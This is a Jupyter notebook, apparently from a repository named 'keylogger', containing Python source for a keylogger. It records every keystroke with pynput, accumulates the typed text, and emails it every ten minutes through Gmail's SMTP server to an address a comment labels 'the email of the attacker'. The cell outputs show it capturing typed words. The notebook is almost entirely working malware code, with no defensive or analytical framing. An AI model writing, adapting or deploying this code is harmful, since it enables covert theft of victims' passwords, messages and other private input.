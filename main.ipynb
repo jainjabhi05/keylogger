{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "import smtplib\n",
    "import schedule\n",
    "import time\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "email=str(\"your mail\") #the email of the attacker\n",
    "password=str(\"your password\")#password for that email account"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "text = \" \"\n",
    "def after_typing(letter):\n",
    "    global text\n",
    "    if letter==keyboard.Key.enter:\n",
    "        text += \"\\n\"\n",
    "    elif letter==keyboard.Key.space:\n",
    "        text += \" \"\n",
    "    elif letter== keyboard.Key.tab:\n",
    "        text += \"\\t\"\n",
    "    elif letter == keyboard.Key.shift:\n",
    "        pass\n",
    "    elif letter== keyboard.Key.backspace and len(text)==0:\n",
    "        pass\n",
    "    elif letter== keyboard.Key.backspace and len(text)>0:\n",
    "        text = text[:-1]\n",
    "    else:\n",
    "        text+= str(letter).strip(\"'\")\n",
    "    if schedule.run_pending():\n",
    "        text = \"modified\"\n",
    "    print(text)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def mailer():\n",
    "    global email\n",
    "    global password\n",
    "    global text\n",
    "    server = smtplib.SMTP('smtp.gmail.com', 587)\n",
    "    server.starttls()\n",
    "    server.login(email, password)\n",
    "    server.sendmail(email,email,text)\n",
    "    server.quit()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "Every 10 minutes do mailer() (last run: [never], next run: 2023-07-08 11:33:06)"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "schedule.every(10).minutes.do(mailer)\n",
    "#scheduling mail every 10 minutes\n",
    "#else we recieve nothing \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      " h\n",
      " he\n",
      " hel\n",
      " hell\n",
      " hello\n",
      " helloh\n",
      " helloho\n",
      " hellohow\n",
      " hellohow \n",
      " hellohow \n",
      "\n",
      " hellohow \n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "with keyboard.Listener(\n",
    "    on_press=after_typing) as listener:\n",
    "    # collects the events every time we press a key\n",
    "    listener.join()\n",
    "    print(\"working\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.4"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
